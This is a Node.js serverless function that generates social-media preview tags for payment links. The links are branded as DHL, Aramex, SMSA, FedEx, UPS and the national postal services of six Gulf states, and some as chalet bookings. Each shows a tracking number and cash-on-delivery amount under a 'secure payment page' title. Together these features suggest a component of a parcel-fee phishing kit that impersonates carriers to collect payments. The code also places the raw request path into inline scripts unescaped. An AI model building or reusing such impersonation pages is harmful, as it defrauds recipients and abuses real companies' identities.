const fs = require('fs');
const path = require('path');

// Service data mapping - matches the serviceLogos.ts file
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlkw: {
    name: "دي إتش إل - DHL الكويت", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlqa: {
    name: "دي إتش إل - DHL قطر", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlom: {
    name: "دي إتش إل - DHL عُمان", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  dhlbh: {
    name: "دي إتش إل - DHL البحرين", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
    ogImage: "/og-fedex.jpg"
  },
  ups: {
    name: "يو بي إس - UPS",
    description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
    ogImage: "/og-ups.jpg"
  },
  empost: {
    name: "البريد الإماراتي - Emirates Post",
    description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
    ogImage: "/og-empost.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  },
  zajil: {
    name: "زاجل - Zajil",
    description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
    ogImage: "/og-zajil.jpg"
  },
  naqel: {
    name: "ناقل - Naqel", 
    description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
    ogImage: "/og-naqel.jpg"
  },
  saudipost: {
    name: "البريد السعودي - Saudi Post",
    description: "المشغل الوطني للبريد في المملكة العربية السعودية",
    ogImage: "/og-saudipost.jpg"
  },
  kwpost: {
    name: "البريد الكويتي - Kuwait Post",
    description: "المشغل الوطني للبريد في دولة الكويت",
    ogImage: "/og-kwpost.jpg"
  },
  qpost: {
    name: "البريد القطري - Qatar Post",
    description: "المشغل الوطني للبريد في دولة قطر",
    ogImage: "/og-qpost.jpg"
  },
  omanpost: {
    name: "البريد العُماني - Oman Post",
    description: "المشغل الوطني للبريد في سلطنة عُمان",
    ogImage: "/og-omanpost.jpg"
  },
  bahpost: {
    name: "البريد البحريني - Bahrain Post",
    description: "المشغل الوطني للبريد في مملكة البحرين",
    ogImage: "/og-bahpost.jpg"
  }
};

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

// Supabase configuration
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseKey = process.env.VITE_SUPABASE_ANON_KEY;

const supabase = supabaseUrl && supabaseKey ? createClient(supabaseUrl, supabaseKey) : null;

// Function to get link data from database
async function getLinkData(linkId) {
  if (!supabase) {
    console.log('Supabase not configured, using fallback data');
    return null;
  }
  
  try {
    const { data, error } = await supabase
      .from('links')
      .select('*')
      .eq('id', linkId)
      .single();
    
    if (error) {
      console.error('Error fetching link data:', error);
      return null;
    }
    
    return data;
  } catch (error) {
    console.error('Error in getLinkData:', error);
    return null;
  }
}

exports.handler = async (event, context) => {
  const { path, queryStringParameters, headers } = event;
  
  // Detect if this is a social media crawler or bot
  const userAgent = headers['user-agent'] || headers['User-Agent'] || '';
  const isCrawler = /facebookexternalhit|twitterbot|linkedinbot|whatsapp|slackbot|telegrambot|bingbot|googlebot|baiduspider|yandexbot|applebot/i.test(userAgent);
  
  // Continue with meta tag generation for both crawlers and regular users
  // Crawlers will read meta tags, regular users will be redirected via JavaScript
  
  // Extract parameters from path: /r/:country/:type/:id or /pay/:id/...
  let pathMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
  let countryCode, type, id;
  
  if (pathMatch) {
    [, countryCode, type, id] = pathMatch;
  } else {
    // Handle payment page routes: /pay/:id/...
    pathMatch = path.match(/^\/pay\/([a-zA-Z0-9-]+)\/(.+)$/);
    if (pathMatch) {
      [, id, subPath] = pathMatch;
      // For payment pages, we need to determine the type from the link data
      type = 'shipping'; // Default to shipping for payment pages
      countryCode = 'SA'; // Default country, will be overridden by link data
    } else {
      // Invalid path - but still serve React app HTML to avoid 404
      // Let React Router handle the 404 page
      return {
        statusCode: 200,
        headers: {
          'Content-Type': 'text/html; charset=utf-8',
        },
        body: `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Loading...</title>
  </head>
  <body>
    <div id="root"></div>
    <script>
      window.location.replace('/index.html' + window.location.search);
    </script>
  </body>
</html>`
      };
    }
  }
  
  // If country not found, use default but don't return 404
  let country = countryData[countryCode];
  if (!country) {
    console.warn(`Country ${countryCode} not found, using default`);
    // Use default country (Saudi Arabia)
    country = countryData['SA'] || { nameAr: 'السعودية', name: 'Saudi Arabia' };
    countryCode = 'SA';
  }
  
  // Try to get link data from database first
  const linkData = await getLinkData(id);
  
  // For payment pages, get country and type from link data if available
  if (linkData?.country_code) {
    countryCode = linkData.country_code;
    const linkCountry = countryData[countryCode];
    if (linkCountry) {
      country = linkCountry;
    }
  }
  
  if (linkData?.type) {
    type = linkData.type;
  }
  
  // Debug logging
  console.log('Link ID:', id);
  console.log('Link Data:', linkData);
  console.log('Query Parameters:', queryStringParameters);
  console.log('Final Country:', countryCode, 'Type:', type);
  
  let title = "";
  let description = "";
  let ogImage = "/og-aramex.jpg";
  let serviceKey = 'aramex'; // fallback
  
  if (type === "shipping") {
    // Determine service key from multiple sources
    if (linkData?.payload?.service_key) {
      serviceKey = linkData.payload.service_key;
      console.log('Using service_key from payload:', serviceKey);
    } else if (linkData?.payload?.service) {
      serviceKey = linkData.payload.service;
      console.log('Using service from payload:', serviceKey);
    } else if (queryStringParameters?.service) {
      serviceKey = queryStringParameters.service;
      console.log('Using service from query params:', serviceKey);
    } else {
      console.log('Using fallback service:', serviceKey);
    }
    
    const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
    const serviceName = linkData?.payload?.service_name || serviceInfo.name;
    
    console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
    
    // Determine if this is a payment page or microsite
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
    
    title = `${pageType} - ${serviceName}`;
    description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
    ogImage = serviceInfo.ogImage;
    
    // Add tracking number to description if available
    if (linkData?.payload?.tracking_number) {
      description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
    }
    
    // Add COD amount if available
    if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
      description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
    }
  } else if (type === "chalet") {
    const chaletName = linkData?.payload?.chalet_name || 'شاليه';
    const isPaymentPage = path.startsWith('/pay/');
    const pageType = isPaymentPage ? 'دفع حجز شاليه' : 'حجز شاليه';
    
    title = `${pageType} - ${chaletName} في ${country.nameAr}`;
    description = `احجز ${chaletName} في ${country.nameAr} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'نظام دفع آمن ومحمي'}`;
    
    // Add guest count and nights if available
    if (linkData?.payload?.guest_count && linkData?.payload?.nights) {
      description += ` - ${linkData.payload.guest_count} ضيف لـ ${linkData.payload.nights} ليلة`;
    }
    
    ogImage = "/og-aramex.jpg"; // Default for chalets
  }
  
  const siteUrl = `https://${event.headers.host}`;
  const fullUrl = `${siteUrl}${path}${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}`;
  const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
  
  // Final debug logging
  console.log('Final meta tags:', { title, description, ogImage, serviceKey });
  
  // Try to read the built index.html file
  // In Netlify, the function runs from the repo root, so dist/index.html should be accessible
  let reactAppHtml = '';
  try {
    // Try multiple possible paths
    const possiblePaths = [
      path.join(process.cwd(), 'dist', 'index.html'),
      path.join(__dirname, '..', '..', 'dist', 'index.html'),
      path.join(__dirname, '..', 'dist', 'index.html'),
      './dist/index.html',
      '../dist/index.html'
    ];
    
    let found = false;
    for (const indexPath of possiblePaths) {
      try {
        if (fs.existsSync(indexPath)) {
          reactAppHtml = fs.readFileSync(indexPath, 'utf8');
          found = true;
          console.log('Found index.html at:', indexPath);
          break;
        }
      } catch (e) {
        continue;
      }
    }
    
    if (!found) {
      throw new Error('index.html not found in any expected location');
    }
  } catch (error) {
    console.error('Could not read index.html, using fallback:', error);
    // Fallback: generate basic HTML with React app structure
    reactAppHtml = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#0EA5E9" />
    <title>${title}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
  </head>
  <body>
    <div id="root"></div>
    <script>
      // Redirect to index.html, React Router will handle the route
      const originalPath = '${path}';
      const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
      // Use a flag to prevent redirect loop
      if (!sessionStorage.getItem('_netlify_redirect')) {
        sessionStorage.setItem('_netlify_redirect', '1');
        window.location.replace('/index.html' + query);
      } else {
        // Update history for React Router
        window.history.replaceState({}, '', originalPath + query);
        sessionStorage.removeItem('_netlify_redirect');
      }
    </script>
  </body>
</html>`;
  }
  
  // Inject meta tags into the HTML
  let html = reactAppHtml;
  
  // Replace title
  html = html.replace(/<title>.*?<\/title>/i, `<title>${title}</title>`);
  
  // Replace or add meta description
  if (html.includes('<meta name="description"')) {
    html = html.replace(/<meta name="description" content=".*?"/i, `<meta name="description" content="${description.replace(/"/g, '&quot;')}"`);
  } else {
    html = html.replace('</head>', `  <meta name="description" content="${description.replace(/"/g, '&quot;')}" />\n</head>`);
  }
  
  // Replace or add OG tags
  const ogTags = `
  <meta property="og:type" content="website" />
  <meta property="og:url" content="${fullUrl}" />
  <meta property="og:title" content="${title.replace(/"/g, '&quot;')}" />
  <meta property="og:description" content="${description.replace(/"/g, '&quot;')}" />
  <meta property="og:image" content="${fullOgImage}" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:image:type" content="image/jpeg" />
  <meta property="og:site_name" content="نظام الدفع الآمن" />
  <meta property="og:locale" content="ar_AR" />
  
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:url" content="${fullUrl}" />
  <meta name="twitter:title" content="${title.replace(/"/g, '&quot;')}" />
  <meta name="twitter:description" content="${description.replace(/"/g, '&quot;')}" />
  <meta name="twitter:image" content="${fullOgImage}" />
  <meta name="twitter:image:alt" content="${title.replace(/"/g, '&quot;')}" />
  
  <link rel="canonical" href="${fullUrl}" />`;
  
  // Remove existing OG tags if any
  html = html.replace(/<meta property="og:.*?"[^>]*>/gi, '');
  html = html.replace(/<meta name="twitter:.*?"[^>]*>/gi, '');
  
  // Insert OG tags before closing head tag
  html = html.replace('</head>', `${ogTags}\n</head>`);
  
  // For regular users, ensure React Router can handle the route
  // Add script to update history if needed
  if (!isCrawler) {
    const routeScript = `
  <script>
    // Update browser history to show the correct path for React Router
    (function() {
      const originalPath = '${path}';
      const query = '${queryStringParameters ? '?' + new URLSearchParams(queryStringParameters).toString() : ''}';
      if (window.location.pathname !== originalPath) {
        window.history.replaceState({}, '', originalPath + query);
      }
    })();
  </script>`;
    html = html.replace('</body>', `${routeScript}\n</body>`);
  }

  return {
    statusCode: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
      'X-Robots-Tag': 'index, follow'
    },
    body: html
  };
};